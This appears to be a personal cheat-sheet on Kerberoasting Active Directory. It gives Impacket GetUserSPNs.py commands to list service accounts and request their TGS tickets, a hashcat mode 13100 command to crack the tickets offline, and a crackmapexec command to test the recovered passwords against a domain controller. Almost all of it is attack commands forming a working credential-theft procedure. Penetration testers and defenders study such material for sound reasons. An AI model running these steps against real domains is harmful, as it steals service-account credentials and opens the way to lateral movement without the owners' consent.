# Kerberoasting with GetUserSPNs.py
  
## [GetUserSPNs.py](http://GetUserSPNs.py) Commands
Listing all SPN accounts
```JavaScript
GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<user>
```
![image 354.png](/image%20354.png)
  
Can now pull all TGS tickets using the -request flag
```JavaScript
GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<user> -request
```
![image 1 262.png](/image%201%20262.png)
  
Can request a single ticket with the -request-user flag
```JavaScript
GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<user> -request-user <user_to_request>
```
![image 2 225.png](/image%202%20225.png)
  
## Cracking with Hashcat
```JavaScript
hashcat -m 13100 <hash> /path/to/wordlist
```
  
  
## Testing Authentication Against a Domain Controller
```JavaScript
crackmapexec smb <IP> -u <user> -p <pass>
```